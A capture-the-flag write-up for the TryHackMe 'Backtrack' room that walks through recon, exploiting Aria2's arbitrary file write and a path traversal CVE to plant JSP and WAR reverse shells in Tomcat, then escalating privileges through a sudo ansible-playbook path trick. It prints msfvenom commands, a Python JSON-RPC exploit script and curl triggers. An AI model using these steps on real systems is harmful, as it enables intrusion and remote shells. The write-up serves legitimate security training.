room_url: https://tryhackme.com/room/backtrack

------------------**Recon**---------------------
**Nmap** scan result in 3 open ports **22** **8080** and **8888**


![1](https://github.com/user-attachments/assets/634aaa04-60b1-48ec-b356-e6b847a5f4ea)


**Aria2 WebUI on port 8888**

![2-Aria2](https://github.com/user-attachments/assets/37f968b7-7c37-4cda-8760-c1c5d3b02339)

**Tomcat on port 8080 and it's protected so default creds don't work (but still considered information disclosure vulnerability)** 

![4-tomcat](https://github.com/user-attachments/assets/1bf7acd9-dde8-4024-9501-4c9bd3547d36)


**directory brute forcing**

start with common.txt word-list and find some endpoints on port **8888** that revealed information on the application:

![gobuster](https://github.com/user-attachments/assets/8cf32916-ab75-4763-89d3-81c11cfb096c)


In setting we find Aria2 version
![00](https://github.com/user-attachments/assets/95a22aab-cbeb-4d1a-ab9b-d037432bdf7e)


![2 1app js](https://github.com/user-attachments/assets/f39185f5-3aa9-4d3a-b892-829953cc1f81)


![6-flags](https://github.com/user-attachments/assets/b44f7255-990e-47b6-ac26-862d30f72bfb)


# Foothold -------------------------------

# code execution can be achieved in two ways using 2 Vulnerabilities
First is **Aria2 Arbitrary File Write Vulnerability**

We can use the web interface to operate aria2 on port 8888 and upload Reverse Shell. Since Tomcat runs on port 8080, we can upload a JSP web shell to "/opt/tomcat/webapps/ROOT" directory and execute it via curl.

-----**steps**-----

**1-Generate a JSP reverse shell payload using **msfvenom****

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.xx.xx.xx LPORT=4445 -f raw > shell.jsp`

**2-start python3 server**

`python3 -m http.server 80`

![0-rev1](https://github.com/user-attachments/assets/b0ea95b4-4e7c-4801-ae5b-635734563cd1)

**3-click on** **Add** **then click on** **By URI's** **and fill as shown in the screenshot, then press start and you will notice the application has requested the file from your server.**

![0-rev](https://github.com/user-attachments/assets/8b030d03-7643-4567-86ab-317d7039793e)

**4-execute the shell using curl  from tomcat**

` curl http://10.10.198.225:8080/shell.jsp`


![0-rev2](https://github.com/user-attachments/assets/0043de64-4d40-4912-8cc6-2052ac10920a)

you can also upload shell using via port **6800** using the following script

```
import requests
import json
import time

ARIA2_RPC_URL = "http://box-ip:6800/jsonrpc"
YOUR_IP = "10.8.20.150"
REVERSE_SHELL_URL = f"http://YOUR-IP/test.jsp"

download_payload = {
    "jsonrpc": "2.0",
    "id": "qwer",
    "method": "aria2.addUri",
    "params": [
        [REVERSE_SHELL_URL],  # Aria2 downloads the reverse shell script
        {"dir": "/opt/tomcat/webapps/ROOT"}  # Save in web root
    ]
}

print("[+] Sending Aria2 download request...")
requests.post(ARIA2_RPC_URL, data=json.dumps(download_payload), headers={"Content-Type": "application/json"})

time.sleep(3)

web_trigger_url = f"http://BOX-IP:8888/test.jsp"

print(f"[+] Trying to execute via browser: {web_trigger_url}")
requests.get(web_trigger_url)  # Access the script via HTTP

print("[+] Check your Netcat listener (nc -lvnp 4444)")
```

# Second method to get code execution is **Path traversal in  Aria2 CVE-2023-39141 allow us to get Tomcat creds and upload war file to get reverse shell**
https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e

![1 1](https://github.com/user-attachments/assets/8969a292-eddd-46c3-9e96-2e7732b4cfdc)


![3](https://github.com/user-attachments/assets/33f4f6ac-87b0-4c33-abb7-594632ab9d2c)


`msfvenom -p java/shell_reverse_tcp lhost=tun0 lport=4444 -f war -o pwn.war`

`curl -v -u tomcat:[REDACTED] --upload-file pwn.war "http://backtrack.thm:8080/manager/text/deploy?path=/foo&update=true"`



![13](https://github.com/user-attachments/assets/a91517be-4198-421c-9a13-1d382b9b2650)

# Shell as wilbur

`sudo -l` show that we can execute ansible-playbook as wilbur


![14](https://github.com/user-attachments/assets/531f2731-039d-427f-90da-0f427af625e6)

**run the following commands to get shell as wilbur, results are in the screenshot**

`echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /dev/shm/tst1.yml`
` chmod 777 /dev/shm/tst1.yml`
`python3 -c "import pty; pty.spawn('/bin/bash')"`
` sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../dev/shm/tst1.yml`


![15](https://github.com/user-attachments/assets/14ad7c36-3a93-4c48-b0fb-e317283f83b7)
